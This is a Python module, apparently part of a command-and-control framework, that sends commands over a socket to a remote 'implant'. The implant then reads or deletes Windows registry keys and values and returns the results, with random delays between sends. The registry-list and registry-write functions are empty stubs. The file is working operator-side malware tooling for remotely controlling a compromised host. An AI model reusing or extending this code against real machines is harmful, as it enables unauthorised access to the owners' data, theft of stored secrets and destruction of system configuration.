# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with registry reading functionality 

SUCCESS = 1
FAILURE = 0

# Command value
REGREAD = 6
REGLIST = 7
REGWRITE = 8
REGDELETE = 9
import time 
import random

# How long we'd like to wait between sends 
WAIT_TIME = random.randrange(1, 5)

'''
Description:
    Prints reg read usage for user 
Params:
    N/A
Returns:
    SUCCESS or FAILURE 
'''
def printRegReadHelp():
    print("""Required params: \n
                -keypath - Path to the registry key we'd like to read \n
                -value - Name of the value we want to read\n""")
    return SUCCESS


'''
Description:
    Performs registry reading functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    keyPath - path to the registry key that holds the value we want to read
    valueName - name of the value under the registry key we want to read 
Returns:
    SUCCESS or FAILURE 
'''
def regRead(sock, keyPath, valueName):
    try:
        # First tell our implant we want to read a registry key 
        print("Sending command...")
        sock.send(bytes(str(REGREAD), "utf-8") + b'\x00')
        time.sleep(WAIT_TIME)

        # Send key path to read
        print("Sending key path...")
        sock.send(keyPath + b'\x00')
        time.sleep(WAIT_TIME)

        # Send value name to read
        print("Sending value name...")
        sock.send(valueName + b'\x00')
        time.sleep(WAIT_TIME)

        # Receiving key value here... probably need a size first 
        data = sock.recv(7)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful reg read file! Getting key size...")

            data = sock.recv(4) 

            keySize = int.from_bytes(data, 'little')

            print("Key data is %i bytes; Receiving data... " % keySize)
            
            data = b''
            dataRead = 0

            # Sockets are sometimes annoying and weird (and fragile)
            while(dataRead < keySize):
                # Either adding 1024 is going to keep us under our key size or...
                if (dataRead + 1024 <= keySize):
                    sockData = sock.recv(1024)
                    data += sockData
                # Grabing 1024 will be too much so just grab the difference
                else:
                    dataToRead = keySize - dataRead
                    sockData = sock.recv(dataToRead)
                    data += sockData
                dataRead = len(data)

            # TODO: this can easily be modified to print according to data type return; currently will only handle strings (well)
            print("Key %s with value %s returned: %s\n" % (keyPath.decode('utf-8'), valueName.decode('utf-8'), data.decode('utf-8')))
            #print("Key %s with value %s returned: %s\n" % (keyPath.decode('utf-8'), valueName.decode('utf-8'), data))

        else:
            print("Implant returned FAILURE!\n")
            print(data)
            return FAILURE

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg read to implant: ", e)
        return FAILURE
    
    
def regList():
    try:

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg list to implant: ", e)
        return FAILURE
    

def regWrite():
    try:

        return SUCCESS
    
    except Exception as e:
        print("ERROR: Could not send reg write to implant: ", e)
        return FAILURE
    

'''
Description:
    Prints reg delete usage for user 
Params:
    N/A
Returns:
    SUCCESS or FAILURE 
'''
def printRegDeleteHelp():
    print("""Required params: \n
                -keypath - Path to the registry key/value we'd like to delete \n
                -value - Name of the value we want to delete\n
            Optional params: \n
                -iskey - The value being passed is a subkey we're deleting, not a value (default:false)\n""")
    return SUCCESS


'''
Description:
    Performs registry deleting functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    isKey - whether or not the value being passed is a subkey to be deleted or a value of a key
    keyPath - path to the registry key that we're deleting
    valueName - name of the value/key we're deleting 
Returns:
    SUCCESS or FAILURE 
'''
def regDelete(sock, isKey, keyPath, valueName):
    try:
         # First tell our implant we want to delete a registry key 
        print("Sending command...")
        sock.send(bytes(str(REGDELETE), "utf-8") + b'\x00')
        time.sleep(WAIT_TIME)

        # Send whether or not we're deleting a key or value 
        print("Sending delete key... (%i)" % isKey)
        sock.send(bytes(str(isKey), 'utf-8') + b'\x00')
        time.sleep(WAIT_TIME)

        # Send key path to delete from
        print("Sending key path...")
        sock.send(keyPath + b'\x00')
        time.sleep(WAIT_TIME)

        # Send value/key name to delete
        print("Sending value/key name...")
        sock.send(valueName + b'\x00')
        time.sleep(WAIT_TIME)

        # Check for success
        data = sock.recv(7)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful reg delete!")

        else:
            print("Implant returned FAILURE!\n")
            print(data)
            return FAILURE

        return SUCCESS
    
    
    except Exception as e:
        print("ERROR: Could not send reg delete to implant: ", e)
        return FAILURE
    